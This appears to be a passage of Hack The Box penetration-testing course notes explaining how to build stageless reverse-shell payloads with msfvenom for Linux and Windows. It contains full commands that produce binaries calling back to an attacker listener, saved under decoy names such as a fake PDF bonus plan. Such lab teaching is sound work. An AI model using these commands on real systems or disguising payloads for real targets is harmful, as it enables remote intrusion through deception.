## Building A Stageless Payload

#### Linux Payload

```shell
3kjS@htb[/htb]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```
#### Creating a Payload

```shell
-p
```

This `option` indicates that msfvenom is creating a payload.
#### Choosing the Payload based on Architecture
`
```shell
linux/x64/shell_reverse_tcp
```

Specifies a `Linux` `64-bit` stageless payload that will initiate a TCP-based reverse shell (`shell_reverse_tcp`).
#### Address To Connect Back To

```shell
LHOST=10.10.14.113 LPORT=443
```
#### Format To Generate Payload In

```shell
-f elf
```

The `-f` flag specifies the format the generated binary will be in. In this case, it will be an [.elf file](https://en.wikipedia.org/wiki/Executable_and_Linkable_Format).

#### Output

```shell
> createbackup.elf
```


## Building a simple Stageless Payload for a Windows system

#### Windows Payload

```shell
3kjS@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```

